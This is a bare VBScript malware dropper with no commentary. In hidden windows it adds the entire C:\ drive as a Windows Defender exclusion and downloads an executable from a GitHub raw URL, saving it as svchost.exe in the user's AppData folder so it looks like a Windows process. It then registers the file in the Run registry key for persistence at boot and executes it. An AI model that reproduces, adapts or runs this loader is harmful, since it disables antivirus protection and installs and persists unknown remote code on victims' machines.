' Create a WScript.Shell object
Set objShell = CreateObject("WScript.Shell")

' Add Exclusion Path for Windows Defender
objShell.Run "powershell -Command ""Add-MpPreference -ExclusionPath 'C:\'""", 0, True

' Define variables
url = "https://github.com/ievercaia/project/raw/refs/heads/main/svchost.exe"
outputFile = objShell.ExpandEnvironmentStrings("%APPDATA%\System\svchost.exe")
dir = objShell.ExpandEnvironmentStrings("%APPDATA%\System")

' Create the directory if it does not exist
Set objFSO = CreateObject("Scripting.FileSystemObject")
If Not objFSO.FolderExists(dir) Then
    objFSO.CreateFolder(dir)
End If

' Sleep for 100 milliseconds
objShell.Run "ping 127.0.0.1 -n 1 > nul", 0, True

' Download the file using PowerShell
objShell.Run "powershell -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & outputFile & "'""", 0, True

' Add registry key to start on boot
objShell.Run "reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" /v svchost /t REG_SZ /d """ & outputFile & """ /f", 0, True

' Start the downloaded executable
objShell.Run outputFile, 0, True

' Exit the script
WScript.Quit